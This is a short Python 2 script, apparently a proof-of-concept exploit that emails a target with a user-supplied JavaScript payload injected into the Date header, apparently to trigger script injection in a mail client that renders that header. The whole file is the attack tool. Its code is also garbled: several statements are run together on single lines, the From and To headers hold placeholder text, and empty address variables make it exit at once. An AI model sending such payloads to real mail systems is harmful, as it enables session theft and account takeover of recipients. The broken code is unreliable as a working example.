#!/usr/bin/python
import smtplib, urllib2, sys

def sendMail(dstemail, frmemail, smtpsrv, payload): msg = "From: EMAL\n"
    msg += "To: EMAIL\n"
    msg += "Date: %s\n" % payload
    msg += "Subject: You haz been pwnd\n" 
    msg += "Content-type: text/html\n\n" 
    msg += "Oh noez, you been had!"
    msg += '\r\n\r\n'
    server = smtplib.SMTP(smtpsrv)

    try:
        server.sendmail(frmemail, dstemail, msg) print "[+] Email sent!"
    except Exception, e:
        print "[-] Failed to send email:"
        print "[*] " + str(e) 
        server.quit()
        
dstemail = "" 
frmemail = ""

if not (dstemail and frmemail): 
    sys.exit()

if __name__ == "__main__": 
    if len(sys.argv) != 3:
        print "(+) usage: %s <server> <js payload>" % sys.argv[0] 
        sys.exit(-1)

    smtpsrv = sys.argv[1] payload = sys.argv[2]
    sendMail(dstemail, frmemail, smtpsrv, payload)

